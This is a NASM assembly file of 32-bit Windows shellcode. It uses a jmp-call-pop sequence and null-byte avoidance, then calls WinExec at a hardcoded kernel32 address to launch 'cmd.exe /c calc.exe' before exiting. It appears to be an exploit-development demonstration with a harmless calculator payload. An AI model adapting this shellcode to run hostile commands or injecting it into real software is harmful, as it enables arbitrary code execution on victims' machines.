; Filename: WinExec-calc.nasm
; Author:  Michael Norris

global _start

section .text
_start:
    jmp short GetCommand        ; Jumps to "GetCommand" label

CommandReturn:
    ; UINT WinExec(LPCSTR lpCmdLine, UINT uCmdShow);
    pop esi                     ; Stores pointer to "cmd.exe /c calc.exeN" in ESI
    xor edx, edx                ; Zeroes EDX
    push edx                    ; 0x0000 for uCmdShow
    mov [esi+19], dl            ; Replaces "N" in ".exeN" with NULL
    push esi                    ; Pointer to "cmd.exe /c calc.exe" for LPCSTR lpCmdLine
    mov eax, 0x7C8623AD         ; Pointer to WinExec in kernel32.dll
    call eax                    ; Call WinExec(LPCSTR "cmd.exe /c calc.exe", UINT 0)

    ; void ExitProcess(UINT uExitCode);
    push edx                    ; 0x0000 for uExitCode
    mov eax, 0x7C80C0E8         ; Pointer to ExitProcess in kernel32.dll
    call eax                    ; Call ExitProcess(UINT 0)

GetCommand:
    call CommandReturn          ; Pushes next address to stack, calls CommandReturn
    db "cmd.exe /c calc.exeN"   ; Command for WinExec
